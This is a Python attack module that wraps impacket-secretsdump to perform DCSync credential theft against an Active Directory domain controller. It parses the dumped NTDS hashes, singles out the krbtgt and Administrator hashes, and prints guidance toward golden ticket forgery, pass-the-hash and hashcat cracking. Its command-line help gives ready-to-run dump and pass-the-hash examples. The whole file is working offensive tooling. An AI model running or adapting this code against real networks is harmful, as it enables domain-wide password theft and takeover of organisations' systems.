import re
import subprocess
import time

TOOL_BINARY = "impacket-secretsdump"

TECHNIQUE_ID   = "T1003.006"
TECHNIQUE_NAME = "DCSync"

NTLM_LINE_RE = re.compile(
    r"^(?:(?P<domain>[A-Za-z0-9._-]+)/)?(?P<name>[^:]+)"
    r":(?P<rid>\d+)"
    r":(?P<lm>[a-fA-F0-9]{32})"
    r":(?P<nt>[a-fA-F0-9]{32}):::$"
)


def run_dcsync(
    domain,
    username,
    dc_ip,
    password=None,
    hashes=None,
    target_user=None,
    timeout=300,
):
    
    start = time.monotonic()

    creds = f"{domain}/{username}"
    if password and not hashes:
        creds += f":{password}"
    full_target = f"{creds}@{dc_ip}"

    cmd = [TOOL_BINARY, full_target]
    if hashes:
        cmd += ["-hashes", hashes]

    if target_user:
        cmd += ["-just-dc-user", target_user]   # surgical: one account
    else:
        cmd += ["-just-dc"]                       # full NTDS dump

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as e:
        return _error(
            f"timed out after {timeout}s — "
            "try targeting a specific user (-just-dc-user krbtgt) first",
            stderr=e.stderr or "",
            duration=time.monotonic() - start,
        )
    except FileNotFoundError:
        return _error(
            f"{TOOL_BINARY!r} not found on PATH. "
            "Install: apt install python3-impacket  OR  pip install impacket",
            duration=time.monotonic() - start,
        )

    try:
        parsed = _parse(result.stdout, result.stderr, result.returncode)

        if parsed["access_denied"]:
            return _error(
                "replication rights missing — account needs 'Replicating Directory Changes' or DA",
                stderr=result.stderr,
                duration=time.monotonic() - start,
            )
        if parsed["auth_failed"]:
            return _error(
                "authentication failed — check credentials",
                stderr=result.stderr,
                duration=time.monotonic() - start,
            )
        if parsed["not_a_dc"]:
            return _error(
                f"target {dc_ip} is not a DC or DRSUAPI not available — confirm DC IP",
                stderr=result.stderr,
                duration=time.monotonic() - start,
            )

        return {
            "technique_id": TECHNIQUE_ID,
            "technique_name": TECHNIQUE_NAME,
            "tool": "dcsync",
            "status": "success",
            "summary": _summary(parsed),
            "data": parsed,
            "error": None,
            "raw_stderr_tail": None,
            "duration_seconds": round(time.monotonic() - start, 2),
        }
    except Exception as e:
        return _error(
            f"unexpected parse error: {e}",
            stderr=result.stderr,
            duration=time.monotonic() - start,
        )


# ─── Internal helpers ──────────────────────────────────────────────────────────

def _parse(stdout, stderr, returncode):
    
    all_hashes = []
    krbtgt_hash = None
    administrator_hash = None

    in_ntds = False
    for line in stdout.splitlines():
        stripped = line.strip()

        if "DRSUAPI" in stripped or "Dumping Domain Credentials" in stripped:
            in_ntds = True
            continue

        if not in_ntds:
            continue

        # Skip info/cleanup lines
        if stripped.startswith("[") or not stripped:
            continue

        m = NTLM_LINE_RE.match(stripped)
        if m:
            name = m.group("name")
            rid = int(m.group("rid"))
            entry = {
                "domain": m.group("domain"),
                "username": name,
                "rid": rid,
                "nt_hash": m.group("nt"),
                "lm_hash": m.group("lm"),
                "is_machine_account": name.endswith("$"),
                "hashcat_mode": 1000,
            }
            all_hashes.append(entry)

            # Spotlight high-value accounts
            if rid == 502 or name.lower() == "krbtgt":
                krbtgt_hash = entry
            if rid == 500 or name.lower() in ("administrator",):
                administrator_hash = entry

    combined = (stdout + " " + (stderr or "")).lower()
    access_denied = any(
        s in combined for s in [
            "access_denied",
            "rpc_s_access_denied",
            "status_access_denied",
            "error 5",
        ]
    )
    auth_failed = any(
        s in combined for s in [
            "status_logon_failure",
            "wrong password",
            "invalid credentials",
        ]
    )
    not_a_dc = any(
        s in combined for s in [
            "not a dc",
            "rpc_s_server_unavailable",
            "failed to connect",
        ]
    )

    return {
        "total_hashes": len(all_hashes),
        "all_hashes": all_hashes,
        "user_hashes": [h for h in all_hashes if not h["is_machine_account"]],
        "machine_hashes": [h for h in all_hashes if h["is_machine_account"]],
        "krbtgt": krbtgt_hash,
        "administrator": administrator_hash,
        "golden_ticket_ready": krbtgt_hash is not None,
        "access_denied": access_denied,
        "auth_failed": auth_failed,
        "not_a_dc": not_a_dc,
        "exit_code": returncode,
    }


def _summary(p):
    lines = [
        f"DCSync: dumped {p['total_hashes']} hash(es) "
        f"({len(p['user_hashes'])} user accounts, {len(p['machine_hashes'])} machine accounts)."
    ]
    if p["krbtgt"]:
        lines.append(
            f"krbtgt hash captured: {p['krbtgt']['nt_hash']}. "
            f"Golden ticket forgery is now possible."
        )
    if p["administrator"]:
        lines.append(
            f"Administrator hash captured: {p['administrator']['nt_hash']}. "
            f"Use directly for PtH or crack with hashcat mode 1000."
        )
    if not p["golden_ticket_ready"]:
        lines.append("krbtgt NOT found in output — may need a targeted -just-dc-user krbtgt run.")
    return " ".join(lines)


def _error(reason, stdout="", stderr="", duration=None):
    return {
        "technique_id": TECHNIQUE_ID,
        "technique_name": TECHNIQUE_NAME,
        "tool": "dcsync",
        "status": "timeout" if "timed out" in reason else "error",
        "summary": f"DCSync failed: {reason}",
        "data": None,
        "error": reason,
        "raw_stderr_tail": (stderr or "")[-500:] or None,
        "duration_seconds": round(duration, 2) if duration is not None else None,
    }


# ─── Terminal smoke-test ───────────────────────────────────────────────────────
# Full: python3 dcsync.py lab.local administrator 10.0.0.5 -p Password123
# Surgical: python3 dcsync.py lab.local administrator 10.0.0.5 -p Password123 --user krbtgt

if __name__ == "__main__":
    import argparse, json

    ap = argparse.ArgumentParser(
        description="DCSync wrapper — manual test harness",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Surgical — just krbtgt (fastest, get the golden ticket material):
  python3 dcsync.py lab.local administrator 10.0.0.5 -p Password123 --user krbtgt

  # Full domain dump:
  python3 dcsync.py lab.local administrator 10.0.0.5 -p Password123

  # PtH:
  python3 dcsync.py lab.local administrator 10.0.0.5 --hashes ':8846f7eaee8fb117ad06bdd830b7586c'

  # Test insufficient privileges:
  python3 dcsync.py lab.local normaluser 10.0.0.5 -p Password123
        """,
    )
    ap.add_argument("domain",   help="Domain name, e.g. lab.local")
    ap.add_argument("username", help="Account with replication rights")
    ap.add_argument("dc_ip",    help="Domain Controller IP")
    ap.add_argument("-p", "--password", default=None)
    ap.add_argument("--hashes",  default=None, help="LMhash:NThash for PtH")
    ap.add_argument("--user",    default=None, dest="target_user",
                    help="Target specific account (e.g. krbtgt, administrator)")
    ap.add_argument("--timeout", type=int, default=300)
    args = ap.parse_args()

    result = run_dcsync(
        domain=args.domain,
        username=args.username,
        dc_ip=args.dc_ip,
        password=args.password,
        hashes=args.hashes,
        target_user=args.target_user,
        timeout=args.timeout,
    )
    print(json.dumps(result, indent=2))